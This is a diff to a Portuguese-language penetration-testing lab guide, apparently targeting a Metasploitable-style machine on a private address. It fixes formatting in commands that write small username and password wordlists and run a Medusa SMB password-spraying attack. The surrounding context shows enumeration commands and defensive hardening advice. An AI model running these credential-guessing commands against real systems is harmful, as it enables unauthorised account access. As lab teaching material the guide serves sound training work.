@@ -142,11 +142,11 @@ enum4linux -a 192.168.56.101 | tee enum4_output.txt
 
 
 ```bash
-echo -e "user\\nmsfadmin\\nservice" > smb\_users.txt
+echo -e "user\nmsfadmin\nservice" > smb\_users.txt
 ```
 
 ```bash
-echo -e "password\\n123456\\nWelcome123\\nmsfadmin" > senhas spray.txt
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas spray.txt
 ```
 
 
@@ -157,7 +157,7 @@ Medusa smbnt (sintaxe genérica — ajuste conforme versão):
 \# Usando arquivo de usuários (-U) e uma pequena wordlist (-P)
 
 ```bash
-medusa -h 192.168.56.101 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T 50
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 ```
 
 
@@ -186,6 +186,7 @@ smbclient -L //192.168.56.20 -U msfadmin
 * Hardening: desabilitar serviços desnecessários; configurar FTP seguro (SFTP/FTPS) ou desativar FTP.
 * Whitelist de IPs para serviços administrativos, quando aplicável.
 * Educação: conscientizar sobre reutilização de senhas e engenharia social.
+
 
 
 
